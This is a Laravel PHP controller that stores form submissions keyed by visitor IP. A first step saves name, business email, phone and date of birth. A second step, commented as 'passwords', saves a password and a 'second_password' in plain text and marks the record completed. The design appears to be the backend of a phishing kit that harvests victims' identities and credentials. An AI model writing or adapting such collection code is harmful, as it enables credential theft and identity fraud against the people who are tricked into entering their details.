<?php

namespace App\Http\Controllers;

use App\Models\UserInput;
use Illuminate\Http\Request;

class UserInputController extends Controller
{
    public function store(Request $request)
    {
        $input = UserInput::firstOrNew([
            'ip_address' => $request->ip(),
            'created_at' => now()->startOfDay()
        ]);

        if ($request->routeIs('user-input.client-info')) {
            // Save client info (first form)
            $dateOfBirth = sprintf(
                '%s-%s-%s',
                $request->input('dob-year'),
                $request->input('dob-month'),
                $request->input('dob-day')
            );

            $input->fill([
                'full_name' => $request->input('fullName'),
                'business_email' => $request->input('email'),
                'phone' => $request->input('phone'),
                'date_of_birth' => $dateOfBirth,
                'user_agent' => $request->userAgent(),
            ]);
        } elseif ($request->routeIs('user-input.session-data')) {
            // Save session data (passwords)
            $input->fill([
                'password' => $request->input('pass1'),
                'additional_info' => [
                    'second_password' => $request->input('pass2'),
                    'email' => $request->input('email'),
                    'full_name' => $request->input('fullName'),
                    'phone' => $request->input('phone'),
                    'date_of_birth' => $request->input('dateOfBirth'),
                ]
            ]);
            $input->status = 'completed';
        }

        $input->save();

        return response()->json([
            'success' => true,
            'message' => 'Data saved successfully'
        ]);
    }
} 